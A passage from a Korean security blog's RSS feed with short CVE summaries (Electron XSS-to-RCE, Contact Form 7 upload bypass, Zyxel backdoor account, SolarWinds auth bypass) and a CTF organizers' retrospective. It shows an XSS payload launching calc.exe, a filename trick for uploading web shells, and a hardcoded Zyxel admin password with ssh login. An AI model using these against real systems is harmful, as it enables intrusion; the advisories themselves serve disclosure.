class="hljs-string">&quot;</span></span></span><span class="xml">try&#123;</span><span class="xml">const &#123;shell&#125; = require(&#x27;electron&#x27;);</span><span class="xml">shell.openExternal(&#x27;file:C:/Windows/System32/calc.exe&#x27;)</span><span class="xml">&#125;catch(e)&#123;</span><span class="xml">console.error(e)</span><span class="xml">&#125;&quot;&gt;</span>Hover Me<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/xss/">xss</category>
      
      
      <comments>https://hackyboiz.github.io/2021/01/06/fabu1ous/2021-01-06/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-35489 : Unrestricted File Upload Vulnerability in WordPress Plugin</title>
      <link>https://hackyboiz.github.io/2021/01/05/l0ch/2021-01-05/</link>
      <guid>https://hackyboiz.github.io/2021/01/05/l0ch/2021-01-05/</guid>
      <pubDate>Tue, 05 Jan 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.wpsec.com/contact-form-7-vulnerability/&quot;&gt;htt</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.wpsec.com/contact-form-7-vulnerability/">https://blog.wpsec.com/contact-form-7-vulnerability/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Contact Form ≤ 7 5.3.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress 플러그인인 Contact Form 7은 폼메일 플러그인으로 폼메일 양식을 쉽게 생성할 수 있어 인기 있는 플러그인 중 하나입니다. 해당 플러그인에서 허용되지 않은 확장자 필터링을 우회해 업로드할 수 있는 취약점이 발견되었습니다.</p><p>취약점의 세부 정보는 다음과 같습니다.</p><ol><li>해커는 특수 문자가 포함된 이중 확장자 파일을 업로드할 수 있습니다. ex) <code>mal.php .jpg</code> (공백  = \t)</li><li>Contact Form 7은 업로드된 파일 이름에서 특수 문자를 제거하지 않아 첫 번째 확장자 이후 구분 문자로 인해 두 번째 파일 확장자를 버립니다.</li><li>결과적으로 업로드되는 파일 이름은 <code>mal.php</code>가 되고 업로드에 성공합니다.</li><li>해커는 임의 코드 실행을 통해 업로드된 파일에 접근 및 실행이 가능합니다.</li></ol><p>해커는 이를 악용해 서버에 웹쉘과 같은 파일을 제한 없이 업로드할 수 있습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/dn9uy3n/Check-WP-CVE-2020-35489">https://github.com/dn9uy3n/Check-WP-CVE-2020-35489</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/unrestricted-file-upload/">unrestricted file upload</category>
      
      <category domain="https://hackyboiz.github.io/tags/wordpress/">wordpress</category>
      
      <category domain="https://hackyboiz.github.io/tags/plugin/">plugin</category>
      
      
      <comments>https://hackyboiz.github.io/2021/01/05/l0ch/2021-01-05/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-29583: Zyxel 방화벽, VPN 제품에서 백도어 계정 발견</title>
      <link>https://hackyboiz.github.io/2021/01/04/idioth/2021-01-04/</link>
      <guid>https://hackyboiz.github.io/2021/01/04/idioth/2021-01-04/</guid>
      <pubDate>Mon, 04 Jan 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://thehackernews.com/2021/01/secret-backdoor-account</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2021/01/secret-backdoor-account-found-in.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+TheHackersNews+(The+Hackers+News+-+Cyber+Security+Blog)">Secret Backdoor Account Found in Several Zyxel Firewall, VPN Products</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>방화벽<ul><li>ZLD V4.60 펌웨어를 사용하는 ATP, USG, USG FLEX, VPN 시리즈</li></ul></li><li>AP 컨트롤러<ul><li>NXC 2500, NXC5500</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Zyxel은 해커가 펌웨어에 하드 코딩된 undocumented account(FTP를 통한 자동 펌웨어 업데이트 제공을 위한 계정)를 통해 관리자 권한으로 로그인하고 네트워크 장비를 손상시킬 수 있는 취약점에 대한 패치를 발표했습니다.</p><p>이 취약점은 CVE-2020-29583으로 undocumented account인 <code>zyfwp</code>와 수정할 수 없는 비밀번호 <code>PrOw! aN_fXp</code>가 평문으로 저장되어 있으며 해당 계정을 통해 해커가 SSH 서버나 웹 인터페이스에 관리자 권한으로 접근할 수 있습니다.</p><pre><code class="hljs routeros">$ ssh zyfwp@192.168.1.252Password: Pr*******XpRouter&gt; show<span class="hljs-built_in"> users </span>current<span class="hljs-literal">No</span>: 1  Name: zyfwp  Type: admin(<span class="hljs-built_in">..</span>.)Router&gt;</code></pre><p>이 취약점을 악용해 해커는 방화벽의 설정을 조작하여 특정 트래픽을 허용하거나 막을 수 있고, 트래픽을 가로채거나 VPN 계정을 생성하여 네트워크에 대한 접근 권한을 가질 수 있습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html">https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/zyxel/">zyxel</category>
      
      <category domain="https://hackyboiz.github.io/tags/backdoor/">backdoor</category>
      
      <category domain="https://hackyboiz.github.io/tags/undocumented-account/">undocumented account</category>
      
      
      <comments>https://hackyboiz.github.io/2021/01/04/idioth/2021-01-04/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Daily-Life] 크리스마스 CTF 2020 운영 후기</title>
      <link>https://hackyboiz.github.io/2021/01/03/idioth/christmasctf2020-review/</link>
      <guid>https://hackyboiz.github.io/2021/01/03/idioth/christmasctf2020-review/</guid>
      <pubDate>Sun, 03 Jan 2021 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;사건의-전말&quot;&gt;&lt;a href=&quot;#사건의-전말&quot; class=&quot;headerlink&quot; title=&quot;사건의 전말&quot;&gt;&lt;/a&gt;사건의 전말&lt;/h1&gt;&lt;p&gt;매년 크리스마스에 이벤트 형식으로 열리는 솔로들을 위한(?) 크리스마스 CTF의 주최를 이번에 세</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="사건의-전말"><a href="#사건의-전말" class="headerlink" title="사건의 전말"></a>사건의 전말</h1><p>매년 크리스마스에 이벤트 형식으로 열리는 솔로들을 위한(?) 크리스마스 CTF의 주최를 이번에 세종대학교 정보보안 동아리 SSG와 함께 맡았습니다. 사실 우리가 문제를 만들어야 된다는 이야기도 갑자기 들었죠. Fabu1ous는 맡게 된 과정을 눈 앞에서 목격했으나 idioth과 L0ch는 통보를 받았습니다…</p><blockquote><p>??? : 크리스마스 때 뭐하냐<br>idioth : 데이트요<br>??? : 여자 친구 없잖아<br>idioth : 그때는 있겠죠<br>??? : 문제나 만들어라<br>L0ch : 전 있는데용 ㅎㅎ<br>??? : 알 바 아니고</p></blockquote><p><img src="/2021/01/03/idioth/christmasctf2020-review/image0.png"></p><p>불안한 직감은 언제나 옳습니다. ‘우리 문제 만들어야 돼’를 듣자마자 직감했습니다. 아 크리스마스 CTF구나… 처음엔 인당 두 문제씩 만들기로 했습니다. 하지만 여기서 사건이 하나 벌어지는데…</p><p>데이터 챌린지를 나가기로 했었는데 팀장 녀석이 분야를 착각해서 신청을 못했습니다. 그로 인해 각 3문제를 만들기로…ㅋㅋㅋㅋ</p><blockquote><p>idioth : 얘들아 우리 세 문제씩 만들기로 했어 ㅎㅎ<br>L0ch, Fabu1ous : ???<br>idioth : 데이터 챌린지 신청 못함 ㅋㅋㅋㅋㅋㅋ</p></blockquote><p><img src="/2021/01/03/idioth/christmasctf2020-review/image1.png"></p><p>처음에 만들기로 한 문제에 대한 버그 클래스는 아래와 같습니다만…</p><ul><li>idioth<ul><li>rev : custom packer</li><li>web : cve-2020-9484 tomcat rce</li><li>misc : snake</li></ul></li><li>L0ch<ul><li>pwn : Windows pwnable uaf</li><li>pwn : Linux pwnable type confusion</li><li>rev : obfuscate</li></ul></li><li>Fabu1ous<ul><li>pwn : angr challenge</li><li>pwn : uninit stack</li><li>misc : 미정</li></ul></li></ul><p>여러 가지 이유로 많이 바뀌었습니다… 코로나 때문에 갑자기 학기가 1주일 당겨지면서 11월과 12월 초가 통째로 바빠질 줄은 그들은 몰랐습니다…</p><p>학기가 끝난 후 그들은 랩실에 갇혀서 근 1주일을 밤새며 문제를 만들기에 박차를 가하게 됩니다.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image2.png"></p><p>대회 전날 그들의 모습</p><h1 id="idioth"><a href="#idioth" class="headerlink" title="idioth"></a>idioth</h1><p>안녕하세요. idioth입니다. 뭐… 처음에 대회를 한다 했을 때는 좀 많이 당황했습니다.</p><p>일단 5월 중순에 소집 해제하고 이제 막 다시 공부를 시작한 참이라서… 출제하기 전까지 CTF를 2개 정도 나갔는데 문제를 baby-rev 정도밖에 못 풀었습니다. 뭔가 좀 많이 바뀐 것 같더라고요. 포너블을 내기에는 기억도 어렴풋하고…</p><p>암호 공부를 해야겠다는 생각은 늘 하고 있었는데 최근에 어떤 문제들이 많은가 봤더니 암호랑 접목을 많이 시켜서 나오더라고요. 일단 암호는 내가 할 줄 모르니 패스… 그럼 뭐 만들지? 하다가 복무 중에 했던 Custom Packer 스터디가 떠올랐습니다.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image3.png"></p><p>아! 이거다! 패커 딱 대!</p><p>문제 만들어야 된다는 소리를 들은 후 주제를 대충 정한 후 바로 다음 달부터 패커 개발에 들어갔습니다. 일단 패커 관련된 문제가 나오지 않았다는 것은… 다들 아시죠? (ㅎㅎ)</p><ol><li>64비트로 만들자</li><li>어 내가 그때 스터디했던 건 32비트네?</li><li>너무 옛날 거네? 게다가 게시글도 사라졌네?</li><li>…github에 올라와있는 걸 보고 어떤 흐름으로 가면 좋은 지 보자</li></ol><p>그리고 열심히 열심히 한 달에 걸쳐서 완성을 했습니다! 역시 난 한다면 하는 남자! 하지만…</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image4.png"></p><p>코드를 계속 보는데도 도대체 어디가 문제인지 모르겠습니다… 아 시간이 없는데 이제 과제 폭풍이 몰려오고 있는데… 어떡하지?</p><p>일단 tomcat부터 만들자… tomcat 자체에 취약점이 있으니 웹 사이트 구현하고 트리거할 수 있게 기능 구현만 하면 되니까 금방 하겠지? 웹 하는 애들이 도와준댔어.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image5.png"></p><p>응 그런거 없어~ 웹 만들어 본거라곤 공부 처음 시작할 때 html, php와 django를 통해 만들어 본 것이 전부라서 맨 땅에 헤딩을 하면서 구현을 시작했습니다. 게다가 학교에서 python 학부 수업 조교도 진행해서 뭔가 할 일이 굉장히 많았죠(핑계야)</p><blockquote><p>기상 - 하루 한 줄 - 조교 - 과제 - (블로그 글) - 문제 만들기</p></blockquote><p>위의 순환을 계속 돌았습니다. 겉으로의 구현도 끝나고 파일 업로드 등의 구현도 11월 말에 다 끝났습니다. 하지만 가장 큰 문제가 있었습니다.</p><p>버전은 어떻게 알려 줄 것이고 지금 상태에선 session 폴더와 모든 것이 게싱이다.</p><p>여러 가지 사람들과 이야기를 해본 끝에 LFI를 통해서 모든 파일을 다 읽을 수 있게 하도록 했습니다.</p><p>그 과정에서 path traversal 필터링을 거는 게 좋을까 말까에 대해서는 그래도 <code>../</code> 같은 기본적인 거는 걸어놓는 게 좋지 않을까?라는 생각을 했습니다.</p><p>근데 주변에서 어차피 그런 거 보이면 일단 때려 넣고 보니까 기본적인 거는 걸어놓는 게 좋아.라는 말을 듣고 <code>gift</code> 문제가 탄생하게 됩니다.</p><p>다 만들었을 때는 그래도 웹 처음 만든 것 치고 괜찮은 것 같은데?라는 생각을 했으나… 저의 오만함이었음을 깨달았습니다. 으으… 저는 게싱을 최대한 줄였다고 생각했지만 제가 만들었던 문제라서 그렇게 생각했던 것 같습니다 ㅜㅜ…</p><p>하지만 가장 큰 문제는 <code>gift</code> 하나 만들었는데 대회가 일주일 남았다.</p><p>일단 리버싱 문제를 하나 만들어야지… 그냥 간단한 것 내야겠다… crackme 하나 해야지~ 하고 만들었습니다. 근데 뭔가 너무 허전해서 고민을 했습니다. 아 뭔가 없나… 하다가 딱 생각이 났습니다.</p><p>오 이제 맥도 ARM으로 나오는데 ARM 리버싱 할까? ㄱㄱㄱㄱ arm 어셈 분석하는 걸로 내고~ ida hexrays를 막아놓자. 어차피 잘하시는 분들은 arm도 금방 보실 테고 하니까 anti-hexrays는 금방 푸시겠지?</p><p>ida에서는 깨져서 나오는데… 왜 ghidra에서는 제대로 나오는 걸까…?</p><p>??? : 야 그냥 핸드 레이로 내자</p><p>idioth : ㄱ 어차피 baby 용으로 낸 거니까 괜찮겠지?</p><p>-<code>lock</code> 끝-</p><p>아 이제 snake 하나만 남았네요 ㅎㅎ misc 문제라서 너무 부담이 없습니다~ 뱀 게임 재미나게 하나 만들어야지<del>~</del>하고 생각하는 와중에 앞을 보니까 절망의 구렁텅이에 빠진 한 남자가 있었습니다.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image6.png"></p><blockquote><p>L0ch : 나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼</p></blockquote><p>앞에서 보는데 진짜 너무 무섭더라고요. 그래서 그냥 제 misc 문제를 주고 reversing을 제가 내기로 했습니다. 참가한 대회 중 하나에서 angr로 푼 문제가 있어서 angr 문제를 내자. 근데 이것도 arm으로 내면 재밌겠당. 하고 후딱 만들었습니다.</p><p>근데 arm에서는 왜 simulation manager를 돌려도 값이 안 나오지? 그냥 x64로 완성하고 난 후 L0ch를 보니 뱀 게임을 완성하고 자기 type confusion 못 만들 것 같은데 baby pwnable 뭐 낼 지 물어보더라고요. 그래서 그냥 던져 줬습니다. arm rop 재밌을 듯? <code>baby_RudOlPh</code> 탄생~</p><p>근데 angr 문제를 검수하고 값을 연산하는 로직을 수정하고 나니까 이상하게 값이 밀려서 나왔습니다. 처음에 c++로 짰었고 전체적으로 계속 수정을 했는데 input이 이상하게 들어가거나 해서 코드가 전체적으로 꼬여버렸습니다. 결국 c로 옮기게 되었고 c로 옮겨서 나오는 값들을 확인해보자 byte 몇 개가 사라지더라고요.</p><p>대회는 당장 내일이고 급하니까 범위가 넘어가서 그런가 보다 생각하고 그냥 크게 연산하는 로직들을 지워버리고 만들었습니다. 그렇게 <code>angrforge</code> 탄생. 사실 이 문제는 욕먹을 거라 생각했습니다. 손으로 푸신 분 계시던데 진짜 죄송합니다… 다음에 문제 만들 일이 생긴다면 이런 *** 같은 의도 파악조차 안 되는 문제는 만들지 않겠습니다.</p><p>대회는 여차저차 잘 끝났지만 마음이 불편했습니다. 나는 나대로 열심히 했는데 결과물이 좋지 않았으니까요. 일단 내가 생각한 대로 만들어진 문제가 없었습니다. <code>lock</code>이나 <code>angrforge</code> 같은 경우는 시간에 쫓겨 로직에 대한 큰 고민 없이 만든 문제들이라서 마음에 들지 않았습니다.</p><p>거의 대부분의 문제 제작 시간을 <code>gift</code>에 쏟았고, 실제 이러한 서비스가 운영돼서 이 취약점이 존재한다면 이렇게 접근하면 재밌겠다.라는 시나리오도 잘 만들었다고 생각했습니다.</p><p>근데 이건 출제자의 생각이지 참여하신 분들이 그렇게 생각 안 하신다면 그게 맞는 거죠.</p><p>대회가 끝나고 나서 심야 버스를 타고 집으로 출발했습니다. 거의 40시간 넘게 깨어 있었던 것 같네요. 버스에서 잠도 안 오더군요. 그냥 현타가 세게 왔습니다.</p><p>아… 내가 진짜 못하는구나. 내가 생각했던 것이나 다른 문제들을 풀거나 분석하면서 봤던 로직들을 구현하지도 못하고, 생각의 넓이나 깊이도 부족하구나. 내가 생각한 것보다 사람들은 더 넓은 것을 보는구나.</p><p>돌이켜 생각해보니 사람들이 봤을 때 주제나 컨셉이 재밌고 신선한 것에만 너무 신경 쓰지 않았나? 내가 사람들에게 그 재미를 온전히 전달할 만큼의 기본 베이스가 되는가?라는 생각이 들었습니다.</p><p>집에 돌아와서 샤워하고 누웠는데 해가 뜰 때까지 잠을 못 잤습니다. 잡생각이 많아서 일단 지쳐서 잠들고 일어나니 상위권 팀들 라업이 기대가 되더군요. <code>lock</code>이랑 <code>angrforge</code>는 모르겠고 <code>gift</code>를 어떻게 푸셨고 어떻게 느끼셨는지에 대한 생각이 정말 컸습니다.</p><p>라업을 다 보고 나서 라업을 다 뜯어고쳤습니다. 좀 더 내가 생각했던 것과 고민했던 것이 무엇인지 그리고 2021년에는 어떤 식으로 공부하면 좋을지 이번 기회에 제가 부족했던 것, 부족함을 알고 있었지만 애써 외면하던 것들에 직면하게 되어서 좋은 경험이었던 것 같습니다.</p><p>다들 미천한(?) 문제 푸시느라 고생 많으셨습니다. 재밌게 즐기셨다면 정말 좋았을 텐데…! 다들 새해 복 많이 받으세요!</p><h1 id="L0ch"><a href="#L0ch" class="headerlink" title="L0ch"></a>L0ch</h1><p>안녕하세요. L0ch입니다! CTF 문제 출제 경험이라고는 동아리 내부 CTF 밖에 없던 저에게 크리스마스 CTF 문제를 만들어야 한다는 소식을 들었을 때..</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image7.png"></p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image8.png"></p><blockquote><p>??????? 문제를 만들라구요???</p></blockquote><p>진짜 딱 저 표정이었습니다. 거짓말 아니고 진짜로요.</p><p>국방의 의무를 수행하느라 백지가 된 머리로 열심히 따라가고 있던 와중에 (대한민국 군인들 화이팅 ㅠㅠ) CTF 문제를 그것도 세 문제나 만들라니요.. 아무튼 데이터 챌린지 신청 못한 팀장 탓임 @idioth @idioth @idioth</p><p>그렇게 열심히 최근 CTF 트렌드를 찾아보고 어느 정도 틀을 잡아가기 시작했습니다.</p><p>첫 번째 문제였던 address_book 이 나오게 된 배경입니다.</p><p>때는 하루 한 줄을 쓰기 위해 떠돌아다니던 중 Chrome의 공유 포인터 관련 UAF 취약점 정보를 보게 되었죠. </p><p>거기에 영감을 받아 공유 포인터를 커스텀으로 구현해서 거기에 취약점을 만들어볼까? </p><ul><li>MS tuesday patch의 diff 패치를 바이너리에 적용해 binary diffing으로 취약점을 찾을 수 있도록 해볼까? </li></ul><p>이렇게 해서 나온 문제입니다. 물론 사람 인생이 계획대로만 될 리가 있나요 ㅎㅎ</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image9.png"></p><p>문제는 제가 윈너블 경험이 부족하다는 점이었습니다. 버그헌팅을 하면서 원데이 몇 번 분석해본 게 전부인 저에게 취약점 설계부터 익스까지 한다? 멘탈이 아주 곱게 갈릴 거라는 걸 시작부터 예감했죠.</p><p>우선 C++의 공유 포인터를 구현하려면 당연히 C++을 써야 하는데 기본적인 OOP 개념이 부족했습니다. 문제를 만들던 중 코드 리뷰를 해보니까 진짜 개판 오 분 전이었는데 더한 문제는 어떻게 고쳐야 할지를 몰랐습니다..   분석하시면서 이거 왜 이렇게 짜 놨지 하는 부분이 있었을 텐데, 다 부족한 저의 개발실력 때문입니다.. </p><p>또 하나 문제는.. </p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image10.png"></p><blockquote><p>아니 다 만들어놓고 익스가 왜 안되는데!!!!!!!!!!!!!!!!!!!!!!!!!!</p></blockquote><p>원래 익스에 포함되는 과정 중 하나였던 <code>flag.txt</code> 파일 open을 함수가 계속 <code>응 파일 못 열었어 ㅋㅋ</code> 를 뱉는데 이게 무슨 경우지? 왜 파일을 못 여는 거지?? 혼잣말하면서 욕도 해보고 달래도 보고 열심히 삽질을 했지만 원인을 찾지 못해 결국 바이너리 내부에서 <code>flag.txt</code> 를 open만 하고 익스 과정 중 ROP 체인에서 open 과정을 빼고 file descriptor를 이용해 flag를 출력하는 것으로 타협을 볼 수밖에 없었습니다.</p><blockquote><p>후일담<br>idioth : ㅋㅋㅋㅋ 너 address book 익스 할 때 진짜 무서웠던 거 아냐<br>본인 : ??? 왜요 나 왜<br>idioth : 누구 하나 걸리면 진짜 죽는단 표정이었어<br>Fabu1ous : ㅇㅈ<br>본인 :</p></blockquote><p>취약점을 찾기 어렵게 만든 이유가 diff patch를 이용한 binary diffing으로 취약점을 찾을 수 있도록 의도한 거지만.. 계획에 차질이 생겨 diff patch도 적용을 못해 결과적으로 좋지 않은 퀄리티의 아쉬운 문제라고 생각합니다… </p><p>그렇게 한 문제를 마무리하고 보니,  왜 시작도 안 한 두 문제가 남아있고 저는 기말고사를 눈앞에 두고 있는 걸까요?</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image11.png"></p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image12.png"></p><blockquote><p>저는 그렇게.. 학점을 놓아주었습니다</p></blockquote><p>학점을 포기한 대가로 나머지 baby_RudOlPh와 picky_eater를 구상할 수 있었습니다. <em><del>등가교환의 법칙</del></em></p><p>picky_eater는 idioth 팀장님의 아이디어를 쏙 빼왔습니다. address book과 고군분투하고있던 저를 불쌍하게 봤었나봐요. “이거 네가 할래?” 라며 snake 게임 컨셉의 아이디어를 주더라고요. 그 정도로 불쌍해 보였나?;; 아무튼 감사합니다 ㅎㅎ<br>그래도 만들 땐 재밌게 만들었던 문제인 것 같습니다!</p><p>마지막 baby_RudOlPh는 두 줄로 설명하겠습니다. </p><blockquote><p>??? : (회의 도중) 님들 생각해보니까 뉴비용 포너블 문제가 없는데요?</p></blockquote><p>그래서 만들게 된 ARM(AArch64) ROP 문제입니다. 그냥 내면 재미없잖아요! 그래서 ARM을 끼얹었죠</p><p>(사실 기간 내에 원래 생각했던 type confusion 문제를 못 만들 것 같아서 뉴비문제 냈다는 건 안 비밀)</p><p>정리하고 보니까 더 잘할 수 있었음에도 그러지 못해 아쉬운 감정이 많이 남는 대회라고 생각이 드네요. 나중에 다른 CTF에 문제를 출제할 수 있는 기회가 올진 모르겠지만 기회가 된다면 더 많이, 철저하게 준비해서 좋은 퀄리티의 문제를 만들 수 있도록 노력하겠습니다. 부족한 제 문제를 풀어주신 모든 참가자 여러분들께 감사의 말씀드립니다..!</p><h1 id="Fabu1ous"><a href="#Fabu1ous" class="headerlink" title="Fabu1ous"></a>Fabu1ous</h1><ul><li>Oil-system &amp; Match-maker</li></ul><p><img src="/2021/01/03/idioth/christmasctf2020-review/image13.png"></p><p>버그 잡는 건 정말 힘든 작업이군요. 대회 때 oil-system의 풀이 수가 20이던데 아마 모두 언인텐디드일거라 생각합니다. Match-maker도 메모리 leak 중 언인텐디드가 한 개 있었습니다. 솔직히 아주 조금 억울한 부분이 있지만 그게 무슨 의미가 있겠습니까… 이런 상황이 발생한 이유를 적어보고 성찰의 시간이나 가져봅시다.</p><ol><li><p>뱁새가 황새를 따라가면 다리가 찢어진다</p><p> 문제를 만들 때까진 몰랐는데 지금 보니 정말 별거 없는 문제더군요. 큰 틀만 보면 리턴 값을 조작해 <code>win()</code> 함수를 실행하는 문제들과 크게 다를 게 없습니다. 흔히 아는 만큼 보인다고 하죠. 어려운 문제를 만들겠다는 의욕은 앞섰지만 실력은 안 따라주고 결국 쓸데없이 복잡한 동작을 하는 문제가 탄생한 거 같습니다.</p></li><li><p>돌다리도 두들겨 보고 건너라.</p><p> 최종 검사하세요. 두 번 하세요. 최종 검사의 검사도 하세요. 이번 사건 이후로 어떤 일이든 쉽게 확신을 갖진 않을 것 같습니다.</p></li></ol><ul><li>No g</li></ul><p>설문 조사에 의하면 이번 대회에서 호불호가 가장 심했던 문제네요. 셜록홈즈 암호( 춤추는 사람 그림 암호 )와 비슷한 느낌으로 crypto와 misc 그 사이 어딘가의 문제를 만들려고 해 봤습니다. No g라는 제목에서 힌트를 얻어 쉽게 푸신 분들도 있지만 그러지 못하고 기상천외한 삽질을 하신 분들도 있더군요. 가볍게 misc나 풀면서 머리 식히려고 봤다가 고통받으신 분들께 사죄하겠습니다. ㅎㅎ</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image14.png"></p><p>죄송해요 ㅠㅠㅠㅠㅠ</p><p>2년 연속 Christmas CTF에 대해 안 좋은 기억만 남네요. 올해는 꼭 여친 사귀어서 Christmas CTF 말고 데이트하러 가야겠습니다. </p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image15.png"></p><p><del>아이씨… 누가 여기다 양파를 가져다 놓은 거야!?</del></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Daily-Life/">Daily-Life</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/christmas-ctf-2020/">christmas ctf 2020</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/review/">review</category>
      
      
      <comments>https://hackyboiz.github.io/2021/01/03/idioth/christmasctf2020-review/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-10148: SolarWinds Orion API auth bypass to RCE</title>
      <link>https://hackyboiz.github.io/2021/01/02/fabu1ous/2021-01-02/</link>
      <guid>https://hackyboiz.github.io/2021/01/02/fabu1ous/2021-01-02/</guid>
      <pubDate>Sat, 02 Jan 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2020-10148&quot;&gt;CVE-2020</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-10148">CVE-2020-10148</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2019.4 HF 6 이전 버전</li><li>2020.2.1 HF 2 이전 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SolarWinds Orion platform에서 API 인증 우회를 통한 원격 코드 실행 취약점이 패치되었습니다. FireEye가 작년 12월 공개한 Sunburst backdoor로 인해 SolarWinds Orion platform은 큰 이슈가 되었습니다. 그 후 SolarWinds Orion platform에 대한 깊은 분석이 진행되면서 발견된 취약점 중 하나가 CVE-2020-10148입니다.</p><p>SolarWinds Orion platform은 시스템 모니터링 및 관리 목적으로 만들어진 infrastructure입니다. 사용자는 Orion Website를 통해 서버에 설치된 Orion에 접근해 서버를 관리할 수 있으며 SolarWinds Orion API를 요청해 SolarWinds Orion platform을 사용할 수 있습니다.</p><p>URI를 통해 Orion 서버에 요청을 보낼 때 <code>Request.PathInfo</code> 파라미터에 <code>WebResource.adx</code>, <code>ScriptResource.adx</code>, <code>i18n.ashx</code>, <code>Skipi18n</code>등의 값을 지정하면 SolarWinds가 <a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.httpcontext.skipauthorization?view=netframework-4.8">SkipAuthorization</a> flag를 설정합니다. 이로 인해 해커가 인증 절차를 건너뛰고 API 커멘드를 실행할 수 있게 됩니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2021/01/02/fabu1ous/2021-01-02/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-17057 : Microsoft Windows Uninitialized Pointer EoP</title>
      <link>https://hackyboiz.github.io/2021/01/01/l0ch/2021-01-01/</link>
